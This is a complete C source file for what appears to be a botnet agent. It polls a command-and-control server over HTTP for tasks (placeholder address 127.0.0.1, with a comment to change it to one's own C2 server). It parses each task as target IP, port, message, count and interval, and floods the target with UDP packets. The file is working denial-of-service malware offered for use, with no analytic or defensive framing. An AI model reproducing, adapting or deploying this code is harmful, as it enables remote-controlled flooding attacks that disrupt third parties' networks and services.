#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <errno.h>

#define C2_IP   "127.0.0.1"   // Change to your C2 server IP
#define C2_PORT 8080          // Change to your C2 server port
#define C2_PATH "/task"       // Path for task fetch
#define TIMEOUT_SEC 5         // Timeout for each request
#define POLL_INTERVAL 10      // Polling interval (fixed)

// Send UDP packets with float wait times
void send_packets(const char *ip, int port, const char *msg, int count, float wait_time) {
    int sock;
    struct sockaddr_in target;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return;
    }

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);

    for (int i = 0; i < count; i++) {
        sendto(sock, msg, strlen(msg), 0, (struct sockaddr *)&target, sizeof(target));
        printf("Sent packet %d/%d to %s:%d\n", i+1, count, ip, port);
        if (wait_time > 0 && i < count - 1) {
            usleep((useconds_t)(wait_time * 1000000)); // convert float sec -> microseconds
        }
    }

    close(sock);
}

char *fetch_task() {
    int sock;
    struct sockaddr_in server;
    char request[512], buffer[2048];
    char *task = NULL;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }

    struct timeval timeout;
    timeout.tv_sec = TIMEOUT_SEC;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("connect");
        close(sock);
        return NULL;
    }

    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n\r\n",
             C2_PATH, C2_IP);

    if (send(sock, request, strlen(request), 0) < 0) {
        perror("send");
        close(sock);
        return NULL;
    }

    int len = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (len > 0) {
        buffer[len] = '\0';
        char *body = strstr(buffer, "\r\n\r\n");
        if (body) {
            body += 4;
            task = strdup(body);
        }
    }

    close(sock);
    return task;
}

int main() {
    printf("Agent started. Polling every %d seconds...\n", POLL_INTERVAL);

    while (1) {
        char *task = fetch_task();
        if (task && strlen(task) > 0) {
            // Format: "ip:port:message:count:interval"
            char ip[64], msg[256];
            int port, count;
            float wait_time;

            if (sscanf(task, "%63[^:]:%d:%255[^:]:%d:%f",
                       ip, &port, msg, &count, &wait_time) == 5) {
                printf("Task: flood %s:%d with '%s' %d times (wait %.3f sec between)\n",
                       ip, port, msg, count, wait_time);
                send_packets(ip, port, msg, count, wait_time);
            } else {
                printf("Invalid task format: %s\n", task);
            }
            free(task);
        }
        sleep(POLL_INTERVAL);
    }
    return 0;
}
